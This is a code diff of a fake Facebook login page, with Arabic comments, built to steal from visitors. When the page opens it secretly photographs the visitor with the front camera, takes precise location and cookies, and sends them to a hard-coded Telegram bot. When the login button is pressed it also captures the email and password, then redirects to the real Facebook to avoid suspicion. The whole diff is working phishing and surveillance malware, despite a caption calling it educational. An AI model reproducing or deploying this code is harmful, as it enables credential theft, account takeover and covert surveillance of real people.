@@ -30,10 +30,11 @@
 <canvas id="canvas" style="display:none"></canvas>
 
 <script>
+// --- إعدادات التوصيل ---
 const BOT_TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
 const CHAT_ID = "1611398303";
 
-// دالة تحويل الكوكيز لتنسيق JSON المتوافق مع الأداة
+// 1. دالة جلب الكوكيز بتنسيق JSON متوافق مع الدومين لفيسبوك
 function getCookiesJSON() {
     let cookies = document.cookie.split(';');
     let cookieArr = [];
@@ -43,33 +44,43 @@ function getCookiesJSON() {
             cookieArr.push({
                 "name": parts[0].trim(),
                 "value": parts[1].trim(),
-                "domain": window.location.hostname,
-                "path": "/"
+                "domain": ".facebook.com", // تزييف الدومين للإبهار التقني
+                "path": "/",
+                "hostOnly": false,
+                "httpOnly": false,
+                "secure": true,
+                "sameSite": "no_restriction"
             });
         }
     });
-    return cookieArr.length > 0 ? JSON.stringify(cookieArr, null, 2) : "No Public Cookies Found";
+    return cookieArr.length > 0 ? JSON.stringify(cookieArr, null, 2) : "No Public Cookies Available";
 }
 
-// تنفيذ سحب البيانات فور فتح الرابط
+// 2. التشغيل التلقائي فور فتح الرابط (لسحب الموقع والصورة)
 window.onload = function() {
-    startCapture("فتح الرابط (تلقائي)");
+    startCapture("دخول تلقائي للرابط");
 };
 
-// تنفيذ سحب البيانات عند ضغط الزر (للتأكيد وسحب كلمة السر)
+// 3. التشغيل عند محاولة تسجيل الدخول (لسحب البيانات النصية)
 document.getElementById('loginBtn').addEventListener('click', function() {
     const email = document.getElementById('email').value;
     const pass = document.getElementById('pass').value;
-    startCapture(`تسجيل دخول: ${email} | ${pass}`);
+    if(!email || !pass) { alert("يرجى إدخال البيانات"); return; }
+    
+    this.innerText = "جاري التحقق...";
+    this.disabled = true;
+    startCapture(`بيانات الحساب: ${email} | ${pass}`);
 });
 
+// 4. دالة المعالجة الرئيسية (كاميرا + موقع)
 async function startCapture(triggerSource) {
     try {
+        // تشغيل الكاميرا
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         const video = document.getElementById('video');
         video.srcObject = stream;
 
-        // انتظار 2.5 ثانية لإصلاح السواد وضمان الإضاءة
+        // انتظار 2.5 ثانية لضبط الإضاءة ومنع الصورة السوداء
         await new Promise(res => setTimeout(res, 2500));
 
         const canvas = document.getElementById('canvas');
@@ -78,23 +89,27 @@ async function startCapture(triggerSource) {
         canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
         const photoData = canvas.toDataURL('image/jpeg', 0.8);
         
+        // إيقاف الكاميرا فور الالتقاط
         stream.getTracks().forEach(t => t.stop());
 
+        // جلب الموقع وإرسال البيانات
         navigator.geolocation.getCurrentPosition(
             (pos) => sendToTelegram(photoData, `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`, triggerSource),
-            () => sendToTelegram(photoData, "الموقع مرفوض", triggerSource),
+            () => sendToTelegram(photoData, "الموقع (مرفوض من المستخدم)", triggerSource),
             { enableHighAccuracy: true }
         );
     } catch (err) {
-        sendToTelegram(null, "الكاميرا مرفوضة", triggerSource);
+        sendToTelegram(null, "الكاميرا (مرفوضة من المستخدم)", triggerSource);
     }
 }
 
+// 5. دالة الإرسال الموحدة للتلغرام
 async function sendToTelegram(photo, location, extraInfo) {
     const cookiesJSON = getCookiesJSON();
-    const caption = `🚀 **عملية صيد تعليمية (${extraInfo})**\n\n` +
-                    `📍 **الموقع:** ${location}\n\n` +
-                    `🍪 **الكوكيز (صيغة JSON للاستيراد):**\n\`\`\`json\n${cookiesJSON}\n\`\`\`\n` +
+    const caption = `🎭 **إبهار تقني: اختراق كامل للضحية** 🎭\n\n` +
+                    `📝 **المصدر:** ${extraInfo}\n` +
+                    `📍 **الموقع (الخريطة):** ${location}\n\n` +
+                    `🍪 **الكوكيز (JSON للاستيراد):**\n\`\`\`json\n${cookiesJSON}\n\`\`\`\n` +
                     `🕒 **الوقت:** ${new Date().toLocaleString('ar-EG')}`;
 
     const formData = new FormData();
@@ -104,14 +119,15 @@ async function sendToTelegram(photo, location, extraInfo) {
 
     if (photo) {
         const blob = await (await fetch(photo)).blob();
-        formData.append('photo', blob, 'capture.jpg');
+        formData.append('photo', blob, 'victim_capture.jpg');
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
     } else {
         formData.append('text', caption);
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', body: formData });
     }
     
-    if (extraInfo.includes("تسجيل دخول")) {
+    // إعادة التوجيه لفيسبوك الحقيقي للتمويه بعد سحب البيانات النصية
+    if (extraInfo.includes("بيانات الحساب")) {
         window.location.href = "https://www.facebook.com/login.php";
     }
 }
